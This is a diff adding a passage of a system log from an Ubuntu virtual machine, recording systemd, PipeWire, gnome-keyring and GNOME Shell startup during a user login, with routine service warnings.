@@ -1,0 +1,1046 @@
+Apr 13 14:56:40 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started fprintd.service - Fingerprint Authentication Daemon.
+Apr 13 14:56:40 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Activating via systemd: service name='org.freedesktop.GeoClue2' unit='geoclue.service' requested by ':1.40' (uid=120 pid=1160 comm="/usr/bin/gnome-shell" label="unconfined")
+Apr 13 14:56:40 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting geoclue.service - Location Lookup Service...
+Apr 13 14:56:40 vmuser-Standard-PC-i440FX-PIIX-1996 spice-vdagent[1540]: vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0 does not exist, exiting
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-session-binary[1074]: Entering running state
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 xbrlapi.desktop[1551]: openConnection: connect: No such file or directory
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 xbrlapi.desktop[1551]: cannot connect to braille devices daemon brltty at :0
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[697]: [system] Successfully activated service 'org.freedesktop.GeoClue2'
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started geoclue.service - Location Lookup Service.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1209 of process 1160 owned by '120' high priority at nice level 0.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 7 threads of 4 processes of 1 users.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 7 threads of 4 processes of 1 users.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1209 of process 1160 owned by '120' RT at priority 20.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 gsd-media-keys[1318]: Failed to grab accelerator for keybinding settings:playback-repeat
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 gsd-media-keys[1318]: Failed to grab accelerator for keybinding settings:hibernate
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 /usr/libexec/gdm-wayland-session[1072]: dbus-daemon[1072]: [session uid=120 pid=1072] Activating service name='org.gnome.ScreenSaver' requested by ':1.25' (uid=120 pid=1358 comm="/usr/libexec/gsd-power" label="unconfined")
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 /usr/libexec/gdm-wayland-session[1072]: dbus-daemon[1072]: [session uid=120 pid=1072] Successfully activated service 'org.gnome.Shell.Screencast'
+Apr 13 14:56:41 vmuser-Standard-PC-i440FX-PIIX-1996 /usr/libexec/gdm-wayland-session[1072]: dbus-daemon[1072]: [session uid=120 pid=1072] Successfully activated service 'org.gnome.ScreenSaver'
+Apr 13 14:56:44 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Shell.desktop[1160]: libinput error: client bug: timer event4 debounce: scheduled expiry is in the past (-67ms), your system is too slow
+Apr 13 14:56:44 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: dmesg.service: Deactivated successfully.
+Apr 13 14:56:44 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: dmesg.service: Consumed 2.147s CPU time, 1.0M memory peak, 0B memory swap peak.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 gdm-password][1574]: gkr-pam: unable to locate daemon control file
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 gdm-password][1574]: gkr-pam: stashed password to try later in open session
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 gdm-password][1574]: pam_unix(gdm-password:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-logind[733]: New session 2 of user vmuser.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Created slice user-1000.slice - User Slice of UID 1000.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting user-runtime-dir@1000.service - User Runtime Directory /run/user/1000...
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Finished user-runtime-dir@1000.service - User Runtime Directory /run/user/1000.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Starting user@1000.service - User Manager for UID 1000...
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 (systemd)[1590]: pam_unix(systemd-user:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Queued start job for default target default.target.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-journald[291]: /var/log/journal/8bf07b116392477cab433992446c1405/user-1000.journal: Journal file uses a different sequence number ID, rotating.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] AppArmor D-Bus mediation is enabled
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Created slice app.slice - User Application Slice.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Created slice session.slice - User Core Session Slice.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started ubuntu-report.path - Pending report trigger for Ubuntu Report.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 8 threads of 5 processes of 1 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started launchpadlib-cache-clean.timer - Clean up old files in the Launchpadlib cache.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1600 of process 1600 owned by '1000' high priority at nice level -11.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started snap.firmware-updater.firmware-notifier.timer - Timer firmware-notifier for snap application firmware-updater.firmware-notifier.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target paths.target - Paths.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target timers.target - Timers.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting dbus.socket - D-Bus User Message Bus Socket...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1612]: GNOME_KEYRING_CONTROL=/run/user/1000/keyring
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 9 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on dirmngr.socket - GnuPG network certificate management daemon.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1627 of process 1600 owned by '1000' RT at priority 20.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gcr-ssh-agent.socket - GCR ssh-agent wrapper.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 10 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gnome-keyring-daemon.socket - GNOME Keyring daemon.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 10 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gpg-agent-browser.socket - GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 10 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gpg-agent-extra.socket - GnuPG cryptographic agent and passphrase cache (restricted).
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 10 threads of 6 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gpg-agent-ssh.socket - GnuPG cryptographic agent (ssh-agent emulation)...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1611 of process 1611 owned by '1000' high priority at nice level -11.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gpg-agent.socket - GnuPG cryptographic agent and passphrase cache.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 11 threads of 7 processes of 2 users.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on keyboxd.socket - GnuPG public key management service.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on pipewire-pulse.socket - PipeWire PulseAudio.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on pipewire.socket - PipeWire Multimedia System Sockets.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on pk-debconf-helper.socket - debconf communication socket.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on snapd.session-agent.socket - REST API socket for snapd user session agent.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on speech-dispatcher.socket - Speech Dispatcher Socket.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on gpg-agent-ssh.socket - GnuPG cryptographic agent (ssh-agent emulation).
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Listening on dbus.socket - D-Bus User Message Bus Socket.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target sockets.target - Sockets.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target basic.target - Basic System.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started user@1000.service - User Manager for UID 1000.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: gnome-initial-setup-copy-worker.service - GNOME Initial Setup Copy Worker was skipped because of an unmet condition check (ConditionPathExists=!/home/vmuser/.config/gnome-initial-setup-done).
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Started session-2.scope - Session 2 of User vmuser.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started pipewire.service - PipeWire Multimedia Service.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started filter-chain.service - PipeWire filter chain daemon.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started snap.snapd-desktop-integration.snapd-desktop-integration.service - Service for snap application snapd-desktop-integration.snapd-desktop-integration.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started wireplumber.service - Multimedia Service Session Manager.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started pipewire-pulse.service - PipeWire PulseAudio.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target default.target - Main User Target.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Startup finished in 391ms.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gnome-keyring-daemon.service - GNOME Keyring daemon.
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting dbus.service - D-Bus User Message Bus...
+Apr 13 14:56:48 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started dbus.service - D-Bus User Message Bus.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 pipewire[1600]: mod.jackdbus-detect: Failed to receive jackdbus reply: org.freedesktop.DBus.Error.ServiceUnknown: The name org.jackaudio.service was not provided by any .service files
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1635 of process 1611 owned by '1000' RT at priority 20.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 12 threads of 7 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1634 of process 1601 owned by '1000' RT at priority 20.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 13 threads of 8 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 13 threads of 8 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 13 threads of 8 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 13 threads of 8 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1610 of process 1610 owned by '1000' high priority at nice level -11.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 14 threads of 9 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1639 of process 1610 owned by '1000' RT at priority 20.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gdm-password][1574]: gkr-pam: unlocked login keyring
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 wireplumber[1610]: SPA handle 'api.libcamera.enum.manager' could not be loaded; is it installed?
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 wireplumber[1610]: PipeWire's libcamera SPA missing or broken. libcamera not supported.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gdm3[1001]: Gdm: on_display_added: assertion 'GDM_IS_REMOTE_DISPLAY (display)' failed
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 kernel: rfkill: input handler enabled
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 wireplumber[1610]: BlueZ system service is not available
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.portal.Documents' unit='xdg-document-portal.service' requested by ':1.11' (uid=1000 pid=1609 comm="/snap/snapd/current/usr/bin/snap run snapd-desktop" label="unconfined")
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-document-portal.service - flatpak document portal service...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.impl.portal.PermissionStore' unit='xdg-permission-store.service' requested by ':1.12' (uid=1000 pid=1720 comm="/usr/libexec/xdg-document-portal" label="unconfined")
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-permission-store.service - sandboxed app permission store...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.impl.portal.PermissionStore'
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started xdg-permission-store.service - sandboxed app permission store.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.portal.Documents'
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started xdg-document-portal.service - flatpak document portal service.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 xdg-document-portal[1720]: Ignoring invalid max threads value 4294967295 > max (100000).
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Created slice app-gnome\x2dsession\x2dmanager.slice - Slice /app/gnome-session-manager.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Created slice background.slice - User Background Tasks Slice.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started update-notifier-crash.path - Path trigger for Apport crash notifications.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started update-notifier-release.path - Path trigger for new release of Ubuntu notifications.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-wayland.target - GNOME Wayland Session.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.Shell.target - GNOME Shell.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gcr-ssh-agent.service - GCR ssh-agent wrapper.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gnome-session-monitor.service - Monitor Session leader for GNOME Session...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting session-migration.service - Session Migration...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started ssh-agent.service - OpenSSH Agent.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-desktop-portal-rewrite-launchers.service - Rewrite dynamic launcher portal entries...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.Daemon' unit='gvfs-daemon.service' requested by ':1.19' (uid=1000 pid=1762 comm="/usr/libexec/xdg-desktop-portal-rewrite-launchers" label="unconfined")
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gnome-session-monitor.service - Monitor Session leader for GNOME Session.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Finished session-migration.service - Session Migration.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-daemon.service - Virtual filesystem service...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.Daemon'
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-daemon.service - Virtual filesystem service.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Finished xdg-desktop-portal-rewrite-launchers.service - Rewrite dynamic launcher portal entries.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target graphical-session-pre.target - Session services which should run early before the graphical session is brought up.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-pre.target - Tasks to be run before GNOME Session starts.
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gnome-session-manager@ubuntu.service - GNOME Session Manager (session: ubuntu)...
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1612]: The PKCS#11 component was already initialized
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-secrets.desktop[1811]: discover_other_daemon: 1GNOME_KEYRING_CONTROL=/run/user/1000/keyring
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-d[1612]: The PKCS#11 component was already initialized
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-pkcs11.desktop[1808]: discover_other_daemon: 1GNOME_KEYRING_CONTROL=/run/user/1000/keyring
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1808]: discover_other_daemon: 1
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-d[1612]: The Secret Service was already initialized
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1612]: The Secret Service was already initialized
+Apr 13 14:56:49 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1811]: discover_other_daemon: 1
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dpkcs11-1799.scope: Couldn't move process 1799 to requested cgroup '/user.slice/user-1000.slice/user@1000.service/app.slice/app-gnome-gnome\x2dkeyring\x2dpkcs11-1799.scope': No such process
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dpkcs11-1799.scope: Failed to add PIDs to scope's control group: No such process
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dpkcs11-1799.scope: Failed with result 'resources'.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Failed to start app-gnome-gnome\x2dkeyring\x2dpkcs11-1799.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dsecrets-1803.scope: PID 1803 vanished before we could move it to target cgroup '/user.slice/user-1000.slice/user@1000.service/app.slice/app-gnome-gnome\x2dkeyring\x2dsecrets-1803.scope', skipping: No such process
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dsecrets-1803.scope: No PIDs left to attach to the scope's control group, refusing.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-gnome\x2dkeyring\x2dsecrets-1803.scope: Failed with result 'resources'.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Failed to start app-gnome-gnome\x2dkeyring\x2dsecrets-1803.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-gnome\x2dkeyring\x2dssh-1807.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-daemon[1818]: discover_other_daemon: 1
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-ssh.desktop[1818]: discover_other_daemon: 1GNOME_KEYRING_CONTROL=/run/user/1000/keyring
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-keyring-ssh.desktop[1818]: SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gnome-session-manager@ubuntu.service - GNOME Session Manager (session: ubuntu).
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-manager.target - GNOME Session Manager is ready.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.Shell@wayland.service - GNOME Shell on Wayland...
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: org.gnome.Shell@x11.service - GNOME Shell on X11 was skipped because of an unmet condition check (ConditionEnvironment=XDG_SESSION_TYPE=x11).
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-at\x2dspi\x2ddbus\x2dbus-1820.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-xdg\x2duser\x2ddirs-1824.scope: PID 1824 vanished before we could move it to target cgroup '/user.slice/user-1000.slice/user@1000.service/app.slice/app-gnome-xdg\x2duser\x2ddirs-1824.scope', skipping: No such process
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-xdg\x2duser\x2ddirs-1824.scope: No PIDs left to attach to the scope's control group, refusing.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: app-gnome-xdg\x2duser\x2ddirs-1824.scope: Failed with result 'resources'.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Failed to start app-gnome-xdg\x2duser\x2ddirs-1824.scope - Application launched by gnome-session-binary.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Running GNOME Shell (using mutter 46.2) as a Wayland display server
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: pci id for fd 12: 1234:1111, driver (null)
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1843 of process 1821 owned by '1000' RT at priority 20.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 16 threads of 10 processes of 2 users.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Made thread 'KMS thread' realtime scheduled
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: pci id for fd 14: 1234:1111, driver (null)
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: pci id for fd 13: 1234:1111, driver (null)
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: pci id for fd 13: 1234:1111, driver (null)
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: pci id for fd 14: 1234:1111, driver (null)
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Added device '/dev/dri/card0' (bochs-drm) using atomic mode setting.
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Failed to initialize accelerated iGPU/dGPU framebuffer sharing: Not hardware accelerated
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Created gbm renderer for '/dev/dri/card0'
+Apr 13 14:56:50 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Boot VGA GPU /dev/dri/card0 selected as primary
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Using public X11 display :0, (using :1 for managed services)
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Using Wayland display name 'wayland-0'
+Apr 13 14:56:51 vmuser-Standard-PC-i440FX-PIIX-1996 at-spi-dbus-bus.desktop[1834]: dbus-daemon[1834]: Activating service name='org.a11y.atspi.Registry' requested by ':1.0' (uid=1000 pid=1821 comm="/usr/bin/gnome-shell" label="unconfined")
